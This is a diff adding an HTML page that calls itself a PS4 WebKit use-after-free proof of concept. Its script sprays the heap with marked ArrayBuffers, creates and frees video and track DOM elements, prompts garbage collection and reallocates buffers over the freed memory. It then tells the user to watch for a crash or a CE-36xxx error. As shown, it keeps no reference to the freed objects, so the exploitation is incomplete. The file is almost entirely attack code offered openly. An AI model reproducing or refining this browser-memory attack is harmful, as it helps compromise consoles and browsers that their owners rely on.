@@ -1,0 +1,72 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PS4 WebKit PoC - UAF Attempt</title>
+  <style>
+    body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
+    #log { white-space: pre-wrap; }
+  </style>
+</head>
+<body>
+  <h1>PS4 WebKit PoC - UAF Attempt</h1>
+  <div id="log">[+] Starting exploit...
+</div>
+
+  <script>
+    function log(msg) {
+      document.getElementById("log").textContent += msg + "\n";
+    }
+
+    // === Stage 1: Heap Spray ===
+    let spray = [];
+    const SPRAY_COUNT = 20000; // Reduced for stability
+
+    log("[*] Spraying heap...");
+    for (let i = 0; i < SPRAY_COUNT; i++) {
+      let buf = new ArrayBuffer(0x100);
+      let view = new Uint32Array(buf);
+      for (let j = 0; j < view.length; j++) {
+        view[j] = 0x41414141; // A marker
+      }
+      spray.push(buf);
+    }
+    log("[+] Heap spray complete.");
+
+    // === Stage 2: Create and Free DOM Objects ===
+    let victim = document.createElement("video");
+    let track = document.createElement("track");
+    victim.appendChild(track);
+
+    document.body.appendChild(victim);
+    log("[*] DOM objects created.");
+
+    setTimeout(() => {
+      victim.removeChild(track);
+      victim.remove();
+      victim = null;
+      track = null;
+      log("[*] DOM objects removed.");
+
+      // Suggest garbage collection
+      for (let i = 0; i < 1000; i++) {
+        let tmp = new Array(1000).fill(0);
+      }
+      log("[*] GC suggested.");
+
+      // === Stage 3: Reallocation Attempt ===
+      let overlap = [];
+      for (let i = 0; i < 1000; i++) {
+        let buf = new ArrayBuffer(0x100);
+        let view = new Uint32Array(buf);
+        for (let j = 0; j < view.length; j++) {
+          view[j] = 0x43434343; // Overlap marker
+        }
+        overlap.push(buf);
+      }
+      log("[+] Reallocation attempt complete. Watch for crash or CE-36xxx.");
+
+    }, 1000);
+  </script>
+</body>
+</html>
